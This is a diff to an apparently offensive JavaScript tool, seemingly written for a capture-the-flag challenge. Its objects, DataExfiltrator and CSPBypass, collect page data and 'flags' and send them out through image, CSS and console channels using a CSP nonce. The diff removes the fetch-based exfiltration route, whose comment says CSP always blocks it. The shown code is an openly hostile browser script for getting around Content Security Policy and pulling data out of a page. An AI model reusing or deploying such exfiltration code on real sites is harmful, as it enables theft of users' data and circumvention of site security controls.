@@ -481,9 +481,7 @@ const DataExfiltrator = {
             case 'image':
                 this.exfiltrateImage(data, nonce);
                 break;
-            case 'fetch':
-                this.exfiltrateFetch(data);
-                break;
+
         }
     },
     
@@ -526,11 +524,7 @@ const DataExfiltrator = {
         console.log('🖼️ [EXFILL] Image exfiltration attempted with nonce');
     },
     
-    exfiltrateFetch(data) {
-        // ❌ REMOVED: Fetch will always be blocked by CSP connect-src directive
-        console.log('❌ [EXFILL] Fetch method disabled - always blocked by CSP connect-src');
-        console.log('💡 [EXFILL] Use CSS or Image exfiltration instead');
-    }
+
 };
 
 // ===================================
@@ -794,7 +788,6 @@ const CSPBypass = {
                     timestamp: new Date().toISOString()
                 };
                 console.log('🚩 [MAIN] Flags found:', flags);
-                DataExfiltrator.exfiltrate(flagData, 'fetch', nonce);
                 DataExfiltrator.exfiltrate(flagData, 'image', nonce);
                 DataExfiltrator.exfiltrate(flagData, 'console', nonce);
                 break;
@@ -819,7 +812,6 @@ const CSPBypass = {
                 const fullData = DataExfiltrator.collect();
                 const huntResults = Hunter.hunt();
                 DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console', nonce);
-                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'fetch', nonce);
                 break;
         }
         
